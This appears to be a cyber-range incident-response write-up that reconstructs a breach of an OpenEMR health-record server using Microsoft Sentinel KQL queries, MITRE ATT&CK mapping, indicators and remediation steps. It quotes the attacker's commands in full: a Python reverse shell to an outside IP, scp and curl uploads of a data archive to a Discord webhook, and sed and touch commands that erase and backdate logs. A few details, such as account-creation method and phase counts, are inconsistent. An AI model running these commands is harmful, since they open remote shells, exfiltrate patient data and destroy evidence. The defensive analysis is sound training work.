
# 🏥 Rocky Clinic — IR Hunt 07
### OpenEMR Breach · End-to-End Incident Reconstruction
**Microsoft Sentinel · KQL · MITRE ATT&CK · Cyber Range**

![Severity](https://img.shields.io/badge/Severity-Critical-red?style=flat-square)
![Status](https://img.shields.io/badge/Status-Resolved-brightgreen?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Microsoft%20Sentinel-blue?style=flat-square)
![Questions](https://img.shields.io/badge/flags-29-orange?style=flat-square)
![Phases](https://img.shields.io/badge/Phases-8-purple?style=flat-square)

<img width="1076" height="400" alt="image" src="https://github.com/user-attachments/assets/0a2ba9a9-26d1-4674-983f-1f18e9788214" />

</div>

---

## Index
 
- [Executive Summary](#executive-summary)
- [Affected Systems](#affected-systems)
- [Evidence Sources & Analysis](#evidence-sources--analysis)
  - [Asset Validation](#-asset-validation)
  - [Discovery](#-discovery)
  - [Privilege Escalation](#-privilege-escalation)
  - [Staging](#-staging)
  - [Persistence](#-persistence)
  - [Command & Control](#-command--control)
  - [Exfiltration](#-exfiltration)
  - [Defense Evasion](#-defense-evasion)
- [Indicators of Compromise](#indicators-of-compromise)
- [Technical Timeline](#technical-timeline)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Response & Recommendations](#response--recommendations)
---
 
## Executive Summary
 
**Incident ID:** INC2026-HUNT07 &nbsp;|&nbsp; **Severity:** Critical &nbsp;|&nbsp; **Status:** Resolved
 
Rocky Clinic runs OpenEMR, a cloud-hosted electronic health record platform managing patient data and clinical workflows. This investigation reconstructs a full operational compromise detected within the Cyber Range environment, spanning **February 4–14, 2026 UTC**.
 
The intrusion began quietly — no ransomware, no outage, no immediate alerts. The threat actor moved methodically through the environment, conducting low-noise reconnaissance before escalating privileges and pivoting to the underlying host infrastructure. What followed was a deliberate, multi-phase operation: credential harvesting, patient data collection, persistence installation, and ultimately exfiltration through a legitimate SaaS platform to avoid detection.
 
**Key findings:**
 
The attacker operated exclusively through the compromised account `it.admin` on host `rocky83` (RockyLinux 9.7, Docker-hosted OpenEMR). After escalating to root via `sudo -i`, they harvested database credentials from `/etc/openemr/audit_export.env`, mapped patient data through Docker volume enumeration, and installed a malicious systemd service (`integration-monitor.service`) as the persistence mechanism. A Python3 reverse shell connected outbound to `20.62.27.80:443`, establishing C2. Data was staged as a tar.gz archive and exfiltrated via `curl -F` to a Discord webhook after an initial `scp` attempt was blocked by network controls. The cleanup phase used `sed -i` to surgically wipe 12 specific log entries from `/var/log/secure` and `/var/log/messages`, and `touch -d` to backdate log timestamps — the latter triggering two EDR alerts classified under T1070.
 
---
 
## Affected Systems
 
| Asset | Detail |
|---|---|
| **Primary Host** | `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net` |
| **OS** | RockyLinux 9.7 |
| **Application** | OpenEMR (containerized via Docker) |
| **Compromised Account** | `it.admin` |
| **Rogue Account Created** | `system` (service account, no login shell) |
 
---
 
## Evidence Sources & Analysis
 
All evidence was collected via Microsoft Sentinel KQL queries across `DeviceProcessEvents`, `DeviceNetworkEvents`, `DeviceFileEvents`, `DeviceInfo`, and `AlertInfo` tables. The investigation window was tightly scoped to **2026-02-04 → 2026-02-14 UTC**.
 
---
 
### 🔵 Asset Validation
 
The first task was anchoring the target host and confirming what was running. A `DeviceInfo` query confirmed the fully qualified hostname and operating system. Docker process telemetry confirmed OpenEMR runs inside containers — not bare-metal — which shapes the entire attack surface for collection and lateral movement.
 
```kql
DeviceInfo
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName startswith "rocky83"
| project TimeGenerated, DeviceName, OSVersion
| top 1 by TimeGenerated desc
```
 
**Host confirmed:** `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net`
**OS confirmed:** RockyLinux 9.7 · **Container runtime:** Docker
 
![Asset validation — FQDN and RockyLinux 9.7 confirmed via DeviceInfo]<img width="945" height="381" alt="1" src="https://github.com/user-attachments/assets/6faaecbd-d771-4274-a089-9aa6f260058c" />

 
![Docker container runtime confirmed via process telemetry] <img width="1088" height="459" alt="2" src="https://github.com/user-attachments/assets/5dfbb877-922f-4bee-b0ab-76e42fa3d71f" />

---
 
### 🔵 Discovery
 
The attacker's first observable action was checking who else was logged into the system — a classic situational awareness move. The command `w` was executed at `2026-02-08T16:25:30Z` with process ID `17507`, marking the start of the active operator session.
 
```kql
DeviceProcessEvents
| where TimeGenerated == todatetime('2026-02-08T16:25:30.735889Z')
| where DeviceName == "rocky83"
| where ProcessCommandLine in ("w","who","users")
| project TimeGenerated, ProcessId, ProcessCommandLine, FileName
```
 
![Discovery — First behavioural tell: command w, PID 17507]<img width="768" height="358" alt="3" src="https://github.com/user-attachments/assets/7988cb9a-8862-4d54-a602-5ca44650a74d" />

 
Anomalous remote logons were identified within the investigation window. The account `it.admin` was observed making repeated inbound connections from the remote IP `68.53.47.150` — alternating between `Network` and `Local` logon types across multiple sessions on `2026-02-07`. This pattern is consistent with an attacker maintaining persistent remote access while pivoting laterally through the host.
 
```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName == "rocky83"
| where LogonType == "RemoteInteractive"
| project Timestamp, AccountName, RemoteIP, LogonType, DeviceName
| order by Timestamp asc
```
 
![Discovery — Anomalous remote logons: it.admin from 68.53.47.150, Network + Local logon types]<img width="990" height="372" alt="5" src="https://github.com/user-attachments/assets/e3e930c0-de81-4fee-9c56-0dc145333f0d" />

 
OS fingerprinting followed immediately. The attacker read `/etc/os-release` across **four distinct time windows** — a systematic pattern confirming they were characterising the environment before escalating. `DeviceInfo` independently confirmed the distribution as **RockyLinux**.
 
```kql
DeviceProcessEvents
| where DeviceName == "rocky83"
| extend FilePath = extract(@"(/etc/\S*(?:release|os-release)\S*)", 1, ProcessCommandLine)
| where isnotempty(FilePath)
| summarize DistinctFiles=dcount(FilePath), Files=make_set(FilePath)
    by bin(TimeGenerated, 5m)
| sort by DistinctFiles desc
```
 
![Discovery — /etc/os-release fingerprinting across 4 time windows + OSDistribution: RockyLinux]<img width="1092" height="385" alt="Q07" src="https://github.com/user-attachments/assets/f74f2fae-d5c5-4822-b04d-2072b281bae5" />

 
---

 
---
 
### 🔵 Privilege Escalation
 
With environment knowledge established, the attacker crossed the trust line. Repeated `sudo -i` executions elevated `it.admin` to a fully privileged root interactive shell. The sudo binary SHA256 `0a74c1c4b3ade9a75139bfb608…` remained consistent across all escalation events — confirming legitimate binary abuse, not a replaced binary.
 
```kql
DeviceProcessEvents
| where ProcessCommandLine has "sudo -i"
| project TimeGenerated, ProcessId, FileName, ProcessCommandLine,
    SHA256, InitiatingProcessCommandLine, AccountName
| order by TimeGenerated desc
```
 
![Privilege escalation — sudo -i chain, SHA256: 0a74c1c4b3ade9a75139bfb608… consistent]<img width="1051" height="461" alt="8" src="https://github.com/user-attachments/assets/fa64b311-19b8-4017-9db4-54df2af250b2" />

 
Immediately after escalating, the attacker interrogated the Docker runtime layer using `docker inspect openemr-mariadb` — identifying the OpenEMR and MariaDB containers as collection targets before touching any data.
 
---
 
### 🔵 Staging
 
With root access secured, the attacker located the data. They read the OpenEMR automation configuration file `/etc/openemr/audit_export.env` via a non-interactive bash session — using `ls`, `stat`, then `sed -n 1,200p` to extract its contents without leaving interactive session traces. This file contained the database credentials.
 
```kql
DeviceProcessEvents
| where DeviceName == "rocky83"
| where TimeGenerated between (datetime(2026-02-09) .. datetime(2026-02-11))
| where ProcessCommandLine contains ".env"
| where InitiatingProcessCommandLine == "-bash"
| project TimeGenerated, AccountName, ProcessCommandLine, FileName
| order by TimeGenerated asc
```
 
![Staging — audit_export.env: ls → stat → sed -n 1,200p credential extraction]<img width="1039" height="353" alt="q10" src="https://github.com/user-attachments/assets/997d4e5e-b278-4980-bca2-1dd8981e9f80" />

 
Physical data location was then mapped using `find /var/lib/docker/volumes -maxdepth 3 -type f`, which exposed the persistent MariaDB storage at `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data`. The attacker now had the exact filesystem path to patient records.
 
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-09T17:03:13Z) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where ProcessCommandLine has "/var/lib/docker"
| project TimeGenerated, AccountName, ProcessCommandLine, FileName
```
 
![Staging — find /var/lib/docker/volumes + mariadb_data path confirmed]<img width="1058" height="408" alt="11 12" src="https://github.com/user-attachments/assets/d2a5d748-721a-40f4-ad2d-3c302e8d4fdd" />

 
An existing operational script `/opt/backup/scripts/backup_manifest.sh` was targeted as a staging vehicle — the attacker hijacked a trusted, already-scheduled execution path rather than building new automation. The staging directory `/var/lib/integrations` was used to organize collected data before movement.
 
---
 
### 🔵 Persistence
 
The attacker established multiple independent persistence mechanisms to survive reboots and account resets.
 
**Rogue service account:** A system-level account named `system` was created using `vipw` — a low-noise method that bypasses the standard `useradd` command-line tool, avoiding easy detections. The `vipw` binary SHA256 was `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0`.
 
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-07) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where ProcessCommandLine contains "useradd"
| where ProcessCommandLine contains "system"
| project TimeGenerated, AccountName, ProcessCommandLine, ProcessId
| order by TimeGenerated asc
```
 
![Persistence — sudo useradd --system svc.monitor + svc.integration account creation]<img width="1088" height="419" alt="15" src="https://github.com/user-attachments/assets/6c8c1b57-190f-4924-91be-762cf8bc3f49" />


 
![Persistence — vipw binary used to create identity, SHA256: dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0]<img width="1065" height="393" alt="16" src="https://github.com/user-attachments/assets/0eaeedaa-028b-4b6d-b2d5-18551ceb89af" />

 
**Malicious systemd service:** `integration-monitor.service` was written to `/etc/systemd/system/` using `cat` — deliberately avoiding text editor artifacts. The service was written three times: first via `cat` (initial skeleton), then via `vim` to arm it with the C2 payload, then a third `vim` write. The **middle write is the armed version**, identified by its distinct SHA256: `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8`.
 
```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-02-07T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName == "rocky83"
| where FileName has ".service"
| where ActionType in ("FileCreated", "FileModified")
| project TimeGenerated, FileName, FolderPath, ActionType,
    SHA256, InitiatingProcessFileName
| order by TimeGenerated asc
```
 
![Persistence — integration-monitor.service first created via cat (no editor artifacts)]<img width="1042" height="279" alt="17 18" src="https://github.com/user-attachments/assets/2c1ea63e-06fe-4233-8e83-72f90b6dec4e" />


 
![Persistence — Three FileCreated events: cat → vim ARMED (SHA256: f71ea834…) → vim]<img width="966" height="482" alt="13 14" src="https://github.com/user-attachments/assets/d09b6918-0779-4c60-beeb-c4d63eeca17a" />


 
The service name `integration-monitor` was chosen deliberately — plausible as a legitimate health monitoring component in a healthcare environment, designed to avoid suspicion during routine security reviews.
 
---
 
### 🔵 Command & Control
 
With the armed service in place, the attacker activated outbound control. A Python3 one-liner established an interactive reverse shell to `20.62.27.80:443`:
 
```
/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
 
The reverse shell spawned an interactive `/bin/sh -i` session with **process ID 8000** — confirmed by correlating the Python3 outbound connection timestamp with the interactive shell PID table.
 
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName contains "it.admin"
| where FileName in ("sh", "bash", "dash")
| where ProcessCommandLine has "-i"
| project InteractiveShellPID = ProcessId, ParentPID = InitiatingProcessId,
    FileName, ProcessCommandLine, TimeGenerated, AccountName
```
 
![C2 — curl outbound to 162.159.135.232:443, C2 network event confirmed] <img width="1088" height="419" alt="20" src="https://github.com/user-attachments/assets/e27a6b3e-26f0-43b3-8f66-d319b1f643e8" />




 
![C2 — Interactive shell sessions: PID 8000 confirmed as active reverse shell] <img width="1035" height="438" alt="21" src="https://github.com/user-attachments/assets/2b0e15f6-c9bf-4338-8302-9f6bca44868c" />

 
---
 
### 🔵 Exfiltration
 
Before moving data, the attacker staged the collected material into a tar.gz archive: `integration_state_2026-02-10_22-00-01.tar.gz`.
 
The **first exfiltration attempt** used `scp` to transfer the archive directly to the C2 server:
```
scp integration_state_2026-02-10_22-00-01.tar.gz streetrack@20.62.27.80:/home/streetrack/
```
This was **blocked by network controls**, forcing a pivot.
 
The **successful exfiltration** used `curl -F` to upload the archive to a Discord webhook — a Living-off-the-Land technique using a legitimate HTTPS platform to bypass network-layer controls that block known C2 IPs:
 
```
curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz \
  https://discord.com/api/webhooks/1471960320636620832/he162lRQsMJ3kKOVBNeiHYutbubwZ0sC-vq7A_phLZx-q4VOS88q4xDOvhxrBqy6nu9K
```
 
```kql
DeviceNetworkEvents
| where DeviceName contains "rocky83"
| where TimeGenerated between (datetime(2026-02-13T20:00:00Z) .. datetime(2026-02-13T21:00:00Z))
| where InitiatingProcessCommandLine has "curl"
| project TimeGenerated, RemoteIP, RemotePort, RemoteUrl,
    InitiatingProcessCommandLine
| order by TimeGenerated asc
```
 
Network telemetry confirmed the exfiltration endpoint: **`162.159.135.232:443`** — a Cloudflare IP proxying the Discord webhook.
 
![Exfiltration — Staged archive + curl -F Discord webhook exfil command]<img width="1076" height="380" alt="22q23" src="https://github.com/user-attachments/assets/3470d8c9-3b62-4ca2-85ad-0590db9e1729" />

 
![Exfiltration — Network confirmation: RemoteIP 162.159.135.232, RemotePort 443]<img width="1076" height="321" alt="25" src="https://github.com/user-attachments/assets/cbd244e3-f36f-4944-8565-169286b828ae" />

 
---
 
### 🔵 Defense Evasion
 
The cleanup phase demonstrated deliberate, precise anti-forensics — not bulk wiping, but surgical removal.
 
**Log erasure:** `sed -i` was used to remove only attacker-related entries from both `/var/log/secure` and `/var/log/messages` between `2026-02-11 16:13–16:16 UTC`. A total of **12 distinct delete operations** targeted patterns matching the attacker's service names and account identifiers — leaving surrounding log entries intact to avoid obvious gaps.
 
```kql
DeviceProcessEvents
| where DeviceName contains "rocky83"
| where TimeGenerated between (datetime(2026-02-11T16:13:00Z) .. datetime(2026-02-11T16:16:00Z))
| where ProcessCommandLine has "sed" and ProcessCommandLine has "-i"
| where ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages")
| distinct ProcessCommandLine
```
 
![Defense Evasion — 12× sed -i surgical log deletion across /var/log/secure + /var/log/messages]<img width="1042" height="376" alt="26q27" src="https://github.com/user-attachments/assets/0c5f312e-c405-4104-8a9f-90b8a0ec11f3" />

 
**Timestamp falsification:** `touch -d "2026-02-06 12:00:00"` backdated `/var/log/messages` by five days — forging the last-modified timestamp to blur the forensic timeline and mislead investigators about when events occurred.
 
![Defense Evasion — touch -d "2026-02-06 12:00:00" /var/log/messages × 4 events]<img width="953" height="369" alt="28" src="https://github.com/user-attachments/assets/b0295d3b-b07c-4fba-8473-00cdbf8b33e0" />

 
**EDR detection:** Despite the attacker's precision, Microsoft Defender EDR independently detected the timestomping activity and generated **two Medium-severity alerts** classified as `DefenseEvasion` — *"Suspicious timestamp modification"* — mapped to `["Indicator Removal (T1070)","Timestomp (T1070.006)"]`.
 
```kql
AlertInfo
| where TimeGenerated between (datetime(2026-02-11T16:00:00Z) .. datetime(2026-02-11T17:00:00Z))
| where DetectionSource contains "EDR"
| project TimeGenerated, DetectionSource, AttackTechniques, Severity, Category, Title
```
 
![Defense Evasion — EDR AlertInfo: T1070 + T1070.006 · Medium · "Suspicious timestamp modification" × 2]<img width="1044" height="313" alt="29" src="https://github.com/user-attachments/assets/cac95f0d-0e87-4fee-9c15-25bd2b40a104" />

 
---
 
## Indicators of Compromise
 
| Type | Value | Context |
|---|---|---|
| **C2 IP** | `20.62.27.80:443` | Python3 reverse shell destination |
| **Exfil IP** | `162.159.135.232:443` | Cloudflare proxy — Discord webhook |
| **Discord Webhook** | `discord.com/api/webhooks/1471960320636620832/he162lRQs…` | Successful exfil destination |
| **Staged Archive** | `integration_state_2026-02-10_22-00-01.tar.gz` | Exfiltrated data package |
| **Malicious Service** | `integration-monitor.service` | SHA256 armed: `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8` |
| **Rogue Account** | `system` | Created via `vipw` SHA256: `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0` |
| **Staging Directory** | `/var/lib/integrations` | Data prep before movement |
| **Credential File** | `/etc/openemr/audit_export.env` | OpenEMR DB credentials harvested |
| **Compromised Account** | `it.admin` | All attacker activity on rocky83 |
 
---
 
## Technical Timeline
 
| Timestamp (UTC) | Phase | Activity |
|---|---|---|
| `2026-02-04` | Asset Validation | rocky83 confirmed — RockyLinux 9.7, Docker, OpenEMR |
| `2026-02-07 01:52` | Persistence | `/opt/backup/scripts/backup_manifest.sh` created via cron |
| `2026-02-07 02:00` | Persistence | `useradd --system svc.monitor` + `svc.integration` — rogue service accounts |
| `2026-02-08 16:25` | Discovery | `w` command (PID 17507) — first behavioural tell, session start |
| `2026-02-08 16:34` | Privilege Escalation | `sudo -i` → root · `docker inspect openemr-mariadb` post-escalation |
| `2026-02-09 15:52` | Staging | `sed -n 1,200p /etc/openemr/audit_export.env` — DB credentials extracted |
| `2026-02-09 17:03` | Staging | `find /var/lib/docker/volumes -maxdepth 3 -type f` — patient data mapped |
| `2026-02-10 17:07` | Persistence | `integration-monitor.service` written via `cat` — no editor telemetry |
| `2026-02-10 17:09` | Persistence | Service armed via `vim` — SHA256: `f71ea834…` payload installed |
| `2026-02-10–13` | Privilege Escalation | `sudo -i` repeated across sessions — consistent SHA256 |
| `2026-02-11 16:14` | Defense Evasion | `sed -i /useradd/d /var/log/secure` — account creation tracks erased |
| `2026-02-11 16:13–16:16` | Defense Evasion | 12× `sed -i` on `/var/log/secure` + `/var/log/messages` — surgical wipe |
| `2026-02-11 16:47` | Defense Evasion | `touch -d "2026-02-06 12:00:00" /var/log/messages` × 4 — timestamp forged |
| `2026-02-11 16:47` | Detection | EDR: T1070 + T1070.006 · Medium · "Suspicious timestamp modification" × 2 |
| `2026-02-13 20:08` | C2 | Python3 reverse shell → `20.62.27.80:443` · PID `8000` activated |
| `2026-02-13 20:10` | Exfiltration | `scp` blocked → pivoted to Discord webhook |
| `2026-02-13 20:10:51` | Exfiltration | `curl -F` → `162.159.135.232:443` · archive confirmed transferred |
 
---
 
## MITRE ATT&CK Mapping
 
| Tactic | Technique ID | Technique Name | How It Was Observed |
|---|---|---|---|
| Discovery | T1082 | System Information Discovery | `/etc/os-release` read across 4 time windows · `DeviceInfo` confirmed RockyLinux 9.7 |
| Discovery | T1613 | Container & Resource Discovery | `docker inspect openemr-mariadb` executed post-escalation to interrogate runtime layer |
| Discovery | T1033 | System Owner/User Discovery | `w` command executed (PID 17507) to enumerate active sessions on rocky83 |
| Discovery | T1078 | Valid Accounts | `it.admin` used throughout — anomalous remote logons from `68.53.47.150` confirmed via `DeviceLogonEvents` |
| Privilege Escalation | T1548.003 | Sudo and Sudo Caching | `sudo -i` executed repeatedly across sessions — consistent SHA256 confirms binary abuse, not replacement |
| Credential Access | T1552.001 | Credentials in Files | `sed -n 1,200p /etc/openemr/audit_export.env` read via non-interactive bash — DB credentials extracted |
| Collection | T1005 | Data from Local System | `find /var/lib/docker/volumes -maxdepth 3 -type f` mapped patient data at `r0ckyyy335_mariadb_data/_data` |
| Collection | T1074.001 | Local Data Staging | Data organized under `/var/lib/integrations` before archiving and movement |
| Persistence | T1543.002 | Systemd Service | `integration-monitor.service` written to `/etc/systemd/system/` · armed via `vim` · SHA256: `f71ea834…` |
| Persistence | T1053.003 | Cron Job | `/opt/backup/scripts/backup_manifest.sh` scheduled via `/etc/cron.d/` entries |
| Persistence | T1136.001 | Create Local Account | `system` account created via `vipw` (SHA256: `dbb79446…`) to avoid standard `useradd` detection |
| Command & Control | T1059.006 | Python | Python3 one-liner reverse shell → `20.62.27.80:443` · interactive `/bin/sh -i` spawned as PID `8000` |
| Command & Control | T1071.001 | Application Layer Protocol: Web | Outbound C2 over HTTPS port 443 · blends with legitimate web traffic · confirmed via `DeviceNetworkEvents` |
| Exfiltration | T1567.002 | Exfiltration Over Web Service | `curl -F` uploaded `integration_state…tar.gz` to Discord webhook · routed through `162.159.135.232:443` |
| Exfiltration | T1048 | Exfiltration Over Alternative Protocol | Initial `scp` attempt to `streetrack@20.62.27.80` blocked by network controls — forced pivot to Discord |
| Defense Evasion | T1070.002 | Clear Linux Logs | 12× `sed -i` surgically deleted attacker-pattern lines from `/var/log/secure` + `/var/log/messages` |
| Defense Evasion | T1070.006 | Timestomp | `touch -d "2026-02-06 12:00:00"` backdated `/var/log/messages` by 5 days · EDR fired Medium alert |
 
 
---
 
## Response & Recommendations
 
**Immediate containment:**
Isolate `rocky83` via network segmentation. Disable `it.admin` and reset all credentials. Block `20.62.27.80` and `162.159.135.232` at the firewall. Revoke the Discord webhook token.
 
**Eradication:**
Remove `integration-monitor.service` from `/etc/systemd/system/` and run `systemctl daemon-reload`. Delete `/etc/cron.d/svc_backup_manifest`. Remove `system`, `svc.monitor`, and `svc.integration` accounts. Audit `/etc/group`, `/etc/shadow`, `/etc/passwd` for unauthorized modifications.
 
**Recovery:**
Restore `/var/log/secure` and `/var/log/messages` from SIEM archives. Rotate all credentials referenced in `/etc/openemr/audit_export.env`. Rebuild the OpenEMR Docker environment from a verified clean image.
 
**Hardening:**
- Implement File Integrity Monitoring (FIM) on `/etc/systemd/system/`, `/etc/cron.d/`, `/var/log/`
- Restrict `sudo` for `it.admin` to specific commands only via sudoers
- Alert on: `sed -i` targeting `/var/log/`, `touch -d` on log files, `curl -F` to non-approved domains, new `.service` file creation
- Add Discord webhook domains to network deny-list
- Enable systemd unit file auditing via `auditd`
- Implement Zero Trust network segmentation between Docker runtime and host OS

 
---
 
<div align="center">
**Amine Mouammine** · Cybersecurity Analyst & Threat Hunter · New York, NY
 
CompTIA Security+ · Microsoft SC-200 · TryHackMe Top 3% · Microsoft Sentinel · KQL · MITRE ATT&CK

## 👤 Analyst

**Amine Mouammine** — Cybersecurity Analyst & Threat Hunter · New York, NY .



---

<div align="center">
<sub>Rocky Clinic · IR Hunt 07 · 29 Questions · 9 Phases · Microsoft Sentinel · 2026</sub>
</div>
